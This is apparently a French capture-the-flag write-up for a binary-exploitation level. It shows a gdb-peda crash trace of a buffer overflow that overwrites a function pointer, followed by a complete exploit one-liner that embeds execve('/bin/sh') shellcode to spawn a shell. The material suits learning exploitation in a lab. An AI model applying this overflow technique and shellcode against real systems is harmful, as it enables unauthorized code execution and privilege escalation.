# Level 09

- On voit qu'une variable est executer en tant que fonction dans le code on comprends donc qu'il faut la remplacer
<pre>
gdb-peda$ r $(python -c "print('A' * 108 + 'BBBB')")

Program received signal SIGSEGV, Segmentation fault.
[----------------------------------registers-----------------------------------]
<strong>EAX: 0x42424242 ('BBBB')</strong>
EBX: 0x804ec20 ("BBBB")
ECX: 0x70 ('p')
EDX: 0x804ebb4 ('A' <repeats 108 times>, "BBBB")
ESI: 0xf7ddb000 --> 0x1e4d6c 
EDI: 0xf7ddb000 --> 0x1e4d6c 
EBP: 0xffffd4c8 --> 0x0 
ESP: 0xffffd4a0 --> 0x804ebb0 --> 0x8048848 --> 0x804873a (<_ZN1NplERS_>:	push   ebp)
EIP: 0x8048682 (<main+142>:	mov    edx,DWORD PTR [eax])
EFLAGS: 0x10287 (CARRY PARITY adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x8048677 <main+131>:	call   0x804870e <_ZN1N13setAnnotationEPc>
   0x804867c <main+136>:	mov    eax,DWORD PTR [esp+0x10]
   0x8048680 <main+140>:	mov    eax,DWORD PTR [eax]
=> 0x8048682 <main+142>:	mov    edx,DWORD PTR [eax]
   0x8048684 <main+144>:	mov    eax,DWORD PTR [esp+0x14]
   0x8048688 <main+148>:	mov    DWORD PTR [esp+0x4],eax
   0x804868c <main+152>:	mov    eax,DWORD PTR [esp+0x10]
   0x8048690 <main+156>:	mov    DWORD PTR [esp],eax
[------------------------------------stack-------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x08048682 in main ()
gdb-peda$ x $eax
0x42424242:	Cannot access memory at address 0x42424242
</pre>
- le programe segfault au moment de mettre le contenue de $eax dans la variable execute en tant que fonction donc on peut changer la fonction execute
- pour simuler le contenu d'une GOT on change edx par l'addresse de debut de str et on y met l'addresse du debut du shellcode
```
./level9 $(python -c "print('\x10\xa0\x04\x08' + '\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80' + 'A' * 83 + '\x0c\xa0\x04\x08')")
```
